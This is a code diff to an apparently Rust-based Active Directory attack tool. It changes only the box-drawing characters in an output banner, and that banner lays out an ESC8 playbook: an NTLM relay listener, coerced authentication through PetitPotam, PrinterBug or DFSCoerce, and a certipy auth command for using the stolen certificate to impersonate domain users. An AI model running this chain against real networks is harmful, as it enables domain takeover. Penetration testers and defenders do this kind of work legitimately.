@@ -213,19 +213,19 @@ impl Esc8AttackConfig {
         );
 
         Ok(format!(
-            "╔═══════════════════════════════════════════════╗\n\
-             ║       ESC8 — NTLM Relay to Web Enrollment      ║\n\
-             ╚═══════════════════════════════════════════════╝\n\n\
+            "+-------------------------------------------------+\n\
+             |       ESC8 - NTLM Relay to Web Enrollment        |\n\
+             +-------------------------------------------------+\n\n\
              Target: {url}\n\
              Template: {template}\n\
              Listener: {listener}:{port}\n\
              {upn_line}\n\n\
-             ── Step 1: Start Relay Listener ───────────────\n\n\
+             -- Step 1: Start Relay Listener -------------------\n\n\
              [ntlmrelayx (Impacket)]\n\
              {ntlmrelayx}\n\n\
              [Certipy]\n\
              {certipy}\n\n\
-             ── Step 2: Coerce Authentication ──────────────\n\
+             -- Step 2: Coerce Authentication ------------------\n\
              Choose one method to force a machine account to\n\
              authenticate to your listener at {listener}:\n\n\
              [PetitPotam (unauthenticated)]\n\
@@ -234,7 +234,7 @@ impl Esc8AttackConfig {
              {printerbug}\n\n\
              [DFSCoerce]\n\
              {dfscoerce}\n\n\
-             ── Step 3: Use the Certificate ────────────────\n\
+             -- Step 3: Use the Certificate --------------------\n\
              certipy auth -pfx <CERT.pfx> -dc-ip <DC_IP>\n\n\
              Note: The relayed machine account's certificate can be\n\
              used for S4U2Self to impersonate any domain user.\n",
